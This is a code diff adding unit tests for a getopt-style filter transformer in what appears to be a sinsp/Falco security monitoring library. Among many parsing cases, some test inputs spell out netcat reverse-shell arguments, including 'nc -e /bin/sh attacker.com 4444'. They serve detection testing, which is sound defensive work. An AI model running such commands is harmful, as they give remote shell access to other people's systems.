@@ -701,3 +701,309 @@ TEST(multivalue_transformer_concat, result_type) {
 	EXPECT_EQ(result.type, PT_CHARBUF);
 	EXPECT_FALSE(result.is_list);
 }
+
+TEST_F(sinsp_with_test_input, multivalue_transformer_getopt) {
+	add_default_init_thread();
+	open_inspector();
+
+	sinsp_evt* evt;
+
+	// Use a simple event - we're testing the transformer logic, not event extraction
+	int64_t dirfd = 3;
+	const char* file_to_run = "/tmp/file_to_run";
+
+	evt = add_event_advance_ts(increasing_ts(),
+	                           1,
+	                           PPME_SYSCALL_OPEN_X,
+	                           6,
+	                           dirfd,
+	                           file_to_run,
+	                           0,
+	                           0,
+	                           0,
+	                           (uint64_t)0);
+
+	// Test basic option without argument: -n
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n",""), "n") intersects ("n"))"));
+
+	// Test option with argument: -t hello
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t", "hello"), "t:") intersects ("t", "hello"))"));
+
+	// Test grouped options: -nt hello
+	EXPECT_TRUE(
+	        eval_filter(evt, R"(getopt(("-nt", "hello"), "nt:") intersects ("n", "t", "hello"))"));
+
+	// Test option with immediate value: -thello
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-thello"), "t:") intersects ("t", "hello"))"));
+
+	// Test multiple separate options
+	EXPECT_TRUE(
+	        eval_filter(evt,
+	                    R"(getopt(("-n", "-t", "hello"), "nt:") intersects ("n", "t", "hello"))"));
+
+	// Test that option not present doesn't match
+	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-n"), "n") intersects ("t"))"));
+
+	// Test -- stops option parsing
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n", "--", "-t"), "nt:") intersects ("n"))"));
+	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-n", "--", "-t"), "nt:") intersects ("t"))"));
+
+	// Test unknown options are skipped
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-x", "-n"), "n") intersects ("n"))"));
+	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-x", "-n"), "n") intersects ("x"))"));
+
+	// Test non-option arguments are skipped
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("arg1", "-n", "arg2"), "n") intersects ("n"))"));
+
+	// Test complex real-world example: nc -l -p 8080 -e /bin/sh
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-l", "-p", "8080", "-e", "/bin/sh"), "lp:e:") intersects ("l", "p", "e", "8080", "/bin/sh"))"));
+
+	// Test grouped options with value: -lpe /bin/sh
+	EXPECT_TRUE(
+	        eval_filter(evt, R"(getopt(("-lpe", "/bin/sh"), "lp:e:") intersects ("l","p","e"))"));
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-lpe", "/bin/sh"), "lpe:") intersects ("/bin/sh"))"));
+
+	// Validation error tests
+	// getopt() requires exactly 2 arguments
+	EXPECT_THROW(eval_filter(evt, R"(getopt() intersects ("n"))"), sinsp_exception);
+	EXPECT_THROW(eval_filter(evt, R"(getopt(("a")) intersects ("n"))"), sinsp_exception);
+	EXPECT_THROW(eval_filter(evt, R"(getopt(("a"), "n", "extra") intersects ("n"))"),
+	             sinsp_exception);
+
+	// getopt() first argument must be a list
+	EXPECT_THROW(eval_filter(evt, R"(getopt("not_a_list", "n") intersects ("n"))"),
+	             sinsp_exception);
+
+	// getopt() second argument must not be a list
+	EXPECT_THROW(eval_filter(evt, R"(getopt(("-n"), ("n")) intersects ("n"))"), sinsp_exception);
+
+	// ========== Edge Cases ==========
+
+	// Empty optstring - no options should be recognized
+	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-n", "-t"), "") intersects ("n"))"));
+	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-n", "-t"), "") intersects ("t"))"));
+
+	// Empty argument list - should return empty result
+	EXPECT_FALSE(eval_filter(evt, R"(getopt((""), "n") intersects ("n"))"));
+
+	// All arguments are non-options - should return empty result
+	EXPECT_FALSE(eval_filter(evt, R"(getopt(("arg1", "arg2", "arg3"), "n") intersects ("n"))"));
+
+	// Single dash "-" is not an option (should be skipped)
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-", "-n"), "n") intersects ("n"))"));
+	EXPECT_FALSE(eval_filter(evt, R"(getopt(("-"), "n") intersects ("n"))"));
+
+	// Option requiring argument but none provided (uses empty string)
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t"), "t:") intersects ("t"))"));
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t"), "t:") intersects (""))"));
+
+	// Multiple dashes in a row
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n", "--", "--"), "n") intersects ("n"))"));
+	EXPECT_FALSE(eval_filter(evt, R"(getopt(("--", "-n"), "n") intersects ("n"))"));
+
+	// Non-alphanumeric characters in option position (should be skipped)
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n-t"), "nt") intersects ("n", "t"))"));
+
+	// ========== Chaining Edge Cases ==========
+
+	// Chain with argument-taking option in the middle: -nat hello
+	// Should parse as: n (no arg), a (takes "t hello" - wait, no)
+	// Actually: n (no arg), a (takes "t" as immediate arg from same token)
+	EXPECT_TRUE(
+	        eval_filter(evt, R"(getopt(("-nat", "hello"), "na:t") intersects ("n", "a", "t"))"));
+
+	// Chain with multiple no-arg options followed by arg-taking option with immediate value
+	EXPECT_TRUE(
+	        eval_filter(evt,
+	                    R"(getopt(("-abcvalue"), "abc:") intersects ("a", "b", "c", "value"))"));
+
+	// Chain where last option takes argument from next token
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-abc", "value"), "abc:") intersects ("a", "b", "c", "value"))"));
+
+	// Same option appearing multiple times
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n", "-n", "-n"), "n") intersects ("n"))"));
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-v", "-v", "-v"), "v") intersects ("v"))"));
+
+	// Option with argument appearing multiple times
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-t", "val1", "-t", "val2"), "t:") intersects ("t", "val1", "val2"))"));
+
+	// ========== Numeric and Special Arguments ==========
+
+	// Options with numeric arguments
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-p", "8080"), "p:") intersects ("p", "8080"))"));
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-p8080"), "p:") intersects ("p", "8080"))"));
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-n", "42"), "n:") intersects ("n", "42"))"));
+
+	// Options with negative numbers as arguments
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t", "-123"), "t:") intersects ("t", "-123"))"));
+
+	// Options with paths as arguments
+	EXPECT_TRUE(
+	        eval_filter(evt,
+	                    R"(getopt(("-f", "/etc/passwd"), "f:") intersects ("f", "/etc/passwd"))"));
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-f", "./relative/path"), "f:") intersects ("f", "./relative/path"))"));
+
+	// Options with URLs as arguments
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-u", "http://example.com:8080/path"), "u:") intersects ("u", "http://example.com:8080/path"))"));
+
+	// Options with empty string as explicit argument
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t", ""), "t:") intersects ("t", ""))"));
+
+	// ========== Real-World Command Examples ==========
+
+	// SSH-like: ssh -p 22 -i keyfile user@host
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-p", "22", "-i", "keyfile", "user@host"), "p:i:") intersects ("p", "22", "i", "keyfile"))"));
+
+	// Tar-like: tar -xzf file.tar.gz
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-xzf", "file.tar.gz"), "xzf:") intersects ("x", "z", "f", "file.tar.gz"))"));
+
+	// Curl-like: curl -X POST -H "header" -d "data" url
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-X", "POST", "-H", "header", "-d", "data", "url"), "X:H:d:") intersects ("X", "POST", "H", "header", "d", "data"))"));
+
+	// Netcat reverse shell: nc -e /bin/sh attacker.com 4444
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-e", "/bin/sh", "attacker.com", "4444"), "e:") intersects ("e", "/bin/sh"))"));
+
+	// Grep-like: grep -rn "pattern" /path
+	EXPECT_TRUE(
+	        eval_filter(evt, R"(getopt(("-rn", "pattern", "/path"), "rn") intersects ("r", "n"))"));
+
+	// Docker-like: docker run -it -p 8080:80 -v /host:/container image
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-it", "-p", "8080:80", "-v", "/host:/container", "image"), "itp:v:") intersects ("i", "t", "p", "8080:80", "v", "/host:/container"))"));
+
+	// Find with exec: find . -name "*.txt" -exec rm {} \;
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-name", "*.txt", "-exec", "rm", "{}", ";"), "n:e:") intersects ("n", "*.txt", "e", "rm"))"));
+
+	// ========== Complex Optstring Patterns ==========
+
+	// All options take arguments
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-a", "1", "-b", "2", "-c", "3"), "a:b:c:") intersects ("a", "1", "b", "2", "c", "3"))"));
+
+	// No options take arguments
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-abc"), "abc") intersects ("a", "b", "c"))"));
+
+	// Alternating: option, arg, option, no-arg
+	EXPECT_TRUE(
+	        eval_filter(evt, R"(getopt(("-a", "val", "-b"), "a:b") intersects ("a", "val", "b"))"));
+
+	// Long chain with mix
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-abcdefg"), "abcdefg") intersects ("a", "b", "c", "d", "e", "f", "g"))"));
+
+	// Numeric option names
+	EXPECT_TRUE(
+	        eval_filter(evt, R"(getopt(("-1", "-2", "-3"), "123") intersects ("1", "2", "3"))"));
+
+	// Mixed alphanumeric options
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-a1b2c3"), "a1b2c3") intersects ("a", "1", "b", "2", "c", "3"))"));
+
+	// ========== Option After Non-Option (GNU Extension) ==========
+
+	// Options scattered among non-options
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("file1", "-n", "file2", "-t", "val", "file3"), "nt:") intersects ("n", "t", "val"))"));
+
+	// Non-options at start, middle, and end
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("arg1", "arg2", "-a", "arg3", "-b", "arg4", "arg5"), "ab") intersects ("a", "b"))"));
+
+	// Option takes non-option as argument
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("regular_file", "-f", "another_file"), "f:") intersects ("f", "another_file"))"));
+
+	// ========== Empty Values and Whitespace ==========
+
+	// Option with whitespace-only argument (if supported by the test framework)
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("-t", " "), "t:") intersects ("t", " "))"));
+
+	// Multiple empty strings in argument list
+	EXPECT_TRUE(eval_filter(evt, R"(getopt(("", "-n", ""), "n") intersects ("n"))"));
+
+	// ========== Stress Tests ==========
+
+	// Very long option chain
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-abcdefghijklmnopqrstuvwxyz"), "abcdefghijklmnopqrstuvwxyz") intersects ("a", "b", "c", "z"))"));
+
+	// Many separate options
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-a", "-b", "-c", "-d", "-e", "-f"), "abcdef") intersects ("a", "b", "c", "d", "e", "f"))"));
+
+	// Option with very long argument value
+	EXPECT_TRUE(eval_filter(
+	        evt,
+	        R"(getopt(("-t", "this_is_a_very_long_argument_value_that_might_test_buffer_handling"), "t:") intersects ("t", "this_is_a_very_long_argument_value_that_might_test_buffer_handling"))"));
+}
+
+TEST(multivalue_transformer_getopt, argument_types) {
+	// Create arguments for getopt: args list and optstring
+	std::vector<std::unique_ptr<sinsp_filter_check>> args;
+
+	// First argument: a list of strings
+	std::vector<std::string> list_values = {"-n", "-t", "value"};
+	args.push_back(std::make_unique<list_check>(list_values));
+
+	// Second argument: optstring
+	args.push_back(std::make_unique<rawstring_check>("nt:"));
+
+	// Create the getopt transformer
+	sinsp_filter_multivalue_transformer_getopt getopt_transformer(std::move(args));
+
+	// Test argument_types()
+	const auto& arg_types = getopt_transformer.argument_types();
+
+	ASSERT_EQ(arg_types.size(), 2);
+
+	// First argument should be PT_CHARBUF and a list
+	EXPECT_EQ(arg_types[0].type, PT_CHARBUF);
+	EXPECT_TRUE(arg_types[0].is_list);
+
+	// Second argument should be PT_CHARBUF and not a list
+	EXPECT_EQ(arg_types[1].type, PT_CHARBUF);
+	EXPECT_FALSE(arg_types[1].is_list);
+}
+
+TEST(multivalue_transformer_getopt, result_type) {
+	std::vector<std::unique_ptr<sinsp_filter_check>> args;
+	std::vector<std::string> list_values = {"-n", "-t", "value"};
+	args.push_back(std::make_unique<list_check>(list_values));
+	args.push_back(std::make_unique<rawstring_check>("nt:"));
+
+	sinsp_filter_multivalue_transformer_getopt getopt_transformer(std::move(args));
+
+	// getopt should return PT_CHARBUF as a list
+	auto result = getopt_transformer.result_type();
+	EXPECT_EQ(result.type, PT_CHARBUF);
+	EXPECT_TRUE(result.is_list);
+}
